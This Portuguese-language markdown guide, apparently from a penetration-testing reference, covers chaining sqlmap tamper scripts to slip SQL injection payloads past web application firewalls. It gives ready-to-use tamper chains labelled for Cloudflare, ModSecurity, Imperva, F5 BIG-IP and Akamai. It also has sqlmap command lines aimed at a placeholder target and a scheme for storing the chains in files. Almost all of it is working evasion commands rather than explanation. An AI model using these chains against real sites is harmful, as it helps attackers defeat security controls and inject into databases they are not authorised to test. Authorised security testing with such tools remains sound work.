# Encadeamento de Tampers

## Como Funciona

Múltiplos tampers são aplicados sequencialmente ao payload. A ordem importa.

```
Payload original: SELECT * FROM users
→ randomcase: SeLeCt * FrOm UsErS
→ space2comment: SeLeCt/**/*/**/FrOm/**/UsErS
→ charencode: %53%65%4c%65%43%74/**/*/**/...
```

## Ordem Recomendada

1. **Modificadores de case** (randomcase) — primeiro
2. **Substituidores de espaço** (space2comment) — segundo
3. **Codificadores** (charencode) — por último

```bash
# Ordem correta
--tamper=randomcase,space2comment,charencode

# Ordem incorreta (encoding antes de substituição de espaço)
--tamper=charencode,space2comment,randomcase  # pode não funcionar
```

## Chains por Cenário

### Scan Básico sem WAF
```bash
--tamper=randomcase
```

### Cloudflare (MySQL)
```bash
--tamper=space2comment,randomcase,charencode
```

### ModSecurity (MySQL) — Agressivo
```bash
--tamper=modsecurityzeroversioned,randomcase,space2comment,charencode
```

### Imperva (MySQL) — Máximo
```bash
--tamper=space2comment,randomcase,between,greatest,charencode
```

### F5 BIG-IP
```bash
--tamper=randomcase,charencode,space2randomblank
```

### Akamai
```bash
--tamper=between,chardoubleencode,randomcase,space2comment
```

## Validação de Chain

```bash
# Ver payload transformado (verbosidade 4)
sqlmap -u "http://alvo.com/?id=1" \
  --tamper=space2comment,randomcase \
  -v 4 \
  --level=1 \
  --batch \
  --technique=E 2>&1 | grep "Payload"
```

## Chains em Arquivo

Salvar chains em `tamper/chains/`:

```bash
# cloudflare.txt
space2comment,randomcase,charencode

# modsecurity.txt
modsecurityzeroversioned,space2comment,randomcase

# imperva.txt
space2comment,randomcase,between,greatest,charencode
```

```bash
# Usar chain de arquivo
CHAIN=$(cat tamper/chains/cloudflare.txt)
sqlmap -u "http://alvo.com/?id=1" --tamper=$CHAIN --batch
```
